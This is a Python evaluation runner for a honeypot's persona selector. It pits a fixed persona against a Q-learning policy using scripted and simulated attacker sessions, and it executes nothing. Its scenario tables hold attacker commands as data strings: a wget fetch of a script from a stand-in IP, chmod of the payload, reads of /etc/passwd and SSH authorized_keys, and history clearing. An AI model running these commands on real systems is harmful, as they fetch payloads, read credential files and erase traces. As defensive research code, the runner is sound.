#!/usr/bin/env python3
"""
Deception Arena runner: Static vs Adaptive honeypot persona strategy, reproducible evaluation mode.

Reuses SentinelAI's own deception code unchanged: calc_reward (the Q-learner's reward), DeceptionQLearner (the
epsilon-greedy / UCB1 policy that recommends personas) and servable_profiles. Nothing here is a second persona
selection algorithm: the static strategy simply never asks the learner.

Isolation guarantees
  * The learner starts from a COPY of the shipped seed table (models/q_table.json) in a temporary directory and its
    save() is disabled, so no Q-table file is ever written. The sha256 of the shipped seed and of the deployed
    runtime table are recorded before and after the run; the run fails if either changed.
  * No network activity except to the SentinelAI backend URL given (default 127.0.0.1); no SSH, no Cowrie restart,
    no command is ever executed: scenario commands are fixed strings used as data.
  * Scenarios come from the allowlist below only. Trials and simulated durations are bounded.

Scenario kinds
  SCRIPTED   fixed command scripts with fixed timing. The attacker cannot react to the persona, so these runs
             validate the mechanics (selection, application, capture, scoring, mapping, reproducibility) and can
             never show an engagement effect.
  SIMULATED  a model attacker whose willingness to continue depends on the persona through ASSUMED, published
             parameters. It tests whether the learner finds the persona the simulator was told to prefer. It says
             nothing about real attackers.

Usage
  python demo/deception_arena.py --dry-run --scenario persona_sensitive_sim --trials 12 --baseline centos_7 --seed 7
  SENTINEL_KEY=... python demo/deception_arena.py --backend http://127.0.0.1:5000 --experiment <experimentId>
"""
import argparse, hashlib, json, os, random, shutil, sys, tempfile, time, urllib.request
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from rl_engine.deception_scorer import (  # noqa: E402  (existing SentinelAI code, used as-is)
    PROFILES_LIST, DeceptionQLearner, calc_reward, is_fingerprint_command, servable_profiles,
)

RUNNER_VERSION = "deception_arena/1"
MAX_TRIALS = 50
SEED_TABLE = ROOT / "models" / "q_table.json"
RUNTIME_TABLE = ROOT / "runtime" / "q_table.json"

# Command strings are data only (documentation-range IPs); intents use the scorer's INTENT_BONUSES names.
SCENARIOS = {
    "scripted_recon": {
        "kind": "SCRIPTED",
        "title": "Scripted reconnaissance (fixed script)",
        "login": True,
        "steps": [("uname -a", "RECONNAISSANCE", 12), ("id", "RECONNAISSANCE", 8), ("cat /etc/passwd", "CREDENTIAL_HARVEST", 15),
                  ("ps aux", "RECONNAISSANCE", 10), ("netstat -tulnp", "RECONNAISSANCE", 20)],
    },
    "scripted_dropper": {
        "kind": "SCRIPTED",
        "title": "Scripted dropper (fixed script)",
        "login": True,
        "steps": [("uname -a", "RECONNAISSANCE", 6), ("wget http://203.0.113.10/x.sh", "MALWARE_DOWNLOAD", 25),
                  ("chmod +x x.sh", "MALWARE_DOWNLOAD", 5), ("crontab -l", "PERSISTENCE", 9)],
    },
    "persona_sensitive_sim": {
        "kind": "SIMULATED",
        "title": "Persona-sensitive simulated attacker (assumed preferences)",
        # ASSUMPTION, not a measurement: probability of running another command after each one, per persona.
        "continueProbability": {"raspberry_pi": 0.88, "ubuntu_22": 0.8, "debian_11": 0.72, "aws_ec2": 0.7, "centos_7": 0.62, "windows_srv": 0.3},
        "fingerprintProbability": 0.04,
        "maxCommands": 14,
        "thinkSeconds": [3, 25],
        "pool": [("uname -a", "RECONNAISSANCE"), ("id", "RECONNAISSANCE"), ("cat /etc/passwd", "CREDENTIAL_HARVEST"),
                 ("ps aux", "RECONNAISSANCE"), ("netstat -tulnp", "RECONNAISSANCE"), ("wget http://203.0.113.10/b.sh", "MALWARE_DOWNLOAD"),
                 ("chmod +x b.sh", "MALWARE_DOWNLOAD"), ("crontab -l", "PERSISTENCE"), ("cat ~/.ssh/authorized_keys", "PERSISTENCE"),
                 ("sudo -l", "PRIVILEGE_ESCALATION"), ("ls -la /root", "RECONNAISSANCE"), ("history -c", "RECONNAISSANCE")],
        "fingerprintCommand": ("systemd-detect-virt", "RECONNAISSANCE"),
    },
}


def sha256(path: Path):
    return hashlib.sha256(path.read_bytes()).hexdigest() if path.exists() else None


def now():
    return datetime.now(timezone.utc).isoformat()


def play_session(scenario: dict, persona: str, rng: random.Random, max_seconds: int) -> dict:
    """One attacker session against `persona`. Scripted scenarios ignore the persona by construction."""
    commands, duration, termination = [], 0, "completed"
    if scenario["kind"] == "SCRIPTED":
        for cmd, intent, wait in scenario["steps"]:
            if duration + wait > max_seconds:
                termination = "time_limit"
                break
            duration += wait
            commands.append({"command": cmd, "intent": intent})
    else:
        p_continue = scenario["continueProbability"].get(persona, 0.5)
        lo, hi = scenario["thinkSeconds"]
        while len(commands) < scenario["maxCommands"]:
            wait = rng.randint(lo, hi)
            if duration + wait > max_seconds:
                termination = "time_limit"
                break
            duration += wait
            if rng.random() < scenario["fingerprintProbability"]:
                cmd, intent = scenario["fingerprintCommand"]
                commands.append({"command": cmd, "intent": intent})
                termination = "fingerprinted"
                break
            cmd, intent = scenario["pool"][rng.randrange(len(scenario["pool"]))]
            commands.append({"command": cmd, "intent": intent})
            if rng.random() > p_continue:
                termination = "attacker_left"
                break
        else:
            termination = "completed"
    session = {"durationSeconds": duration, "commands": commands, "loginSucceeded": bool(scenario.get("login", True)), "iocCount": 0}
    return {**session, "termination": termination, "fingerprinted": any(is_fingerprint_command(c["command"]) for c in commands),
            "reward": round(calc_reward(session), 4)}


def validate(cfg: dict) -> dict:
    if cfg.get("scenario") not in SCENARIOS:
        raise ValueError("scenario not in allowlist")
    if cfg.get("baselinePersona") not in PROFILES_LIST:
        raise ValueError("unknown persona")
    n = int(cfg.get("trialsPerStrategy", 0))
    if not 1 <= n <= MAX_TRIALS:
        raise ValueError(f"trialsPerStrategy must be 1..{MAX_TRIALS}")
    mx = int(cfg.get("maxTrialSeconds", 600))
    if not 30 <= mx <= 3600:
        raise ValueError("maxTrialSeconds must be 30..3600")
    return {"scenario": cfg["scenario"], "baselinePersona": cfg["baselinePersona"], "trialsPerStrategy": n,
            "maxTrialSeconds": mx, "seed": int(cfg.get("seed", 0)), "adaptiveEnabled": cfg.get("adaptiveEnabled", True) is not False}


def run(cfg: dict, on_trial=lambda t: False) -> dict:
    """Runs the paired trials; on_trial(trial) returning True requests cancellation. Returns the provenance."""
    cfg = validate(cfg)
    scenario = SCENARIOS[cfg["scenario"]]
    before = {"seedTable": sha256(SEED_TABLE), "runtimeTable": sha256(RUNTIME_TABLE)}
    random.seed(cfg["seed"])  # the learner's exploration draws (module-level random in deception_scorer)
    tmp = Path(tempfile.mkdtemp(prefix="deception_arena_"))
    cancelled = False
    try:
        table = tmp / "q_table.json"
        shutil.copyfile(SEED_TABLE, table)
        learner = DeceptionQLearner(q_table_path=str(table))
        learner.save = lambda: None  # never persist, not even the temporary copy
        start_policy = {"policy": learner.policy, "epsilon": round(learner.current_epsilon(), 4), "episodes": learner.episode_count}
        state = cfg["baselinePersona"]
        strategies = ["STATIC", "ADAPTIVE"] if cfg["adaptiveEnabled"] else ["STATIC"]
        for i in range(cfg["trialsPerStrategy"]):
            order = strategies if i % 2 == 0 else list(reversed(strategies))  # alternate order between pairs
            for pos, strategy in enumerate(order):
                rng = random.Random(cfg["seed"] * 100003 + i)  # same attacker stream for both members of a pair
                started = now()
                decision = None
                if strategy == "STATIC":
                    persona = cfg["baselinePersona"]
                else:
                    greedy = learner.greedy_action(state)
                    recommended = learner.choose_action(state)
                    q_row = {a: round(v, 4) for a, v in learner.q_table.get(state, {}).items()}
                    persona = recommended if recommended in servable_profiles() else state
                    decision = {"state": state, "recommendedPersona": recommended, "appliedPersona": persona,
                                "explored": recommended != greedy, "policy": learner.policy,
                                "epsilon": round(learner.current_epsilon(), 4), "qValues": q_row}
                outcome = play_session(scenario, persona, rng, cfg["maxTrialSeconds"])
                if strategy == "ADAPTIVE":
                    # Credit the persona that served the session, from the previous persona (same as SessionScorer)
                    learner.update(state, persona, outcome["reward"], persona)
                    state = persona
                trial = {"strategy": strategy, "index": i, "pairPosition": pos, "persona": persona, "decision": decision,
                         "startedAt": started, "endedAt": now(), **outcome}
                if on_trial(trial):
                    cancelled = True
                    break
            if cancelled:
                break
        after = {"seedTable": sha256(SEED_TABLE), "runtimeTable": sha256(RUNTIME_TABLE)}
        if after != before:
            raise RuntimeError("a Q-table file changed during the run")
        return {"runnerVersion": RUNNER_VERSION, "scenarioKind": scenario["kind"], "scenario": {k: v for k, v in scenario.items()},
                "learnerStart": start_policy, "learnerSource": "temporary copy of models/q_table.json (shipped seed); never saved",
                "qTableHashes": {"before": before, "after": after}, "cancelled": cancelled, "config": cfg}
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def _post(url: str, key: str, body: dict) -> dict:
    req = urllib.request.Request(url, data=json.dumps(body).encode(), method="POST",
                                 headers={"Content-Type": "application/json", "X-API-Key": key})
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read() or b"{}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dry-run", action="store_true", help="print the result as JSON; contact nothing")
    ap.add_argument("--backend", default="http://127.0.0.1:5000")
    ap.add_argument("--experiment", help="experimentId created in the Deception Arena page")
    ap.add_argument("--scenario", default="scripted_recon")
    ap.add_argument("--trials", type=int, default=6)
    ap.add_argument("--baseline", default="centos_7")
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--max-seconds", type=int, default=600)
    ap.add_argument("--static-only", action="store_true")
    a = ap.parse_args()
    if a.dry_run:
        trials = []
        prov = run({"scenario": a.scenario, "baselinePersona": a.baseline, "trialsPerStrategy": a.trials, "seed": a.seed,
                    "maxTrialSeconds": a.max_seconds, "adaptiveEnabled": not a.static_only}, lambda t: trials.append(t) and False)
        print(json.dumps({"provenance": prov, "trials": trials}, indent=1))
        return
    host = a.backend.split("//")[-1].split("/")[0].split(":")[0]
    if host not in ("127.0.0.1", "localhost", "::1", "[::1]"):
        sys.exit("Refusing: the runner only talks to a local SentinelAI backend")
    key = os.getenv("SENTINEL_KEY")
    if not key or not a.experiment:
        sys.exit("SENTINEL_KEY and --experiment are required")
    base = f"{a.backend.rstrip('/')}/api/deception-arena/runner/{a.experiment}"
    cfg = _post(base + "/claim", key, {"runnerVersion": RUNNER_VERSION})["data"]["config"]
    try:
        prov = run(cfg, lambda t: bool(_post(base + "/trials", key, {"trial": t})["data"].get("cancelRequested")))
        _post(base + "/complete", key, {"provenance": prov})
        print(f"Experiment {a.experiment}: {'cancelled' if prov['cancelled'] else 'completed'}")
    except Exception as e:  # report and leave nothing running
        _post(base + "/fail", key, {"reason": f"{type(e).__name__}: {e}"[:400]})
        raise


if __name__ == "__main__":
    main()
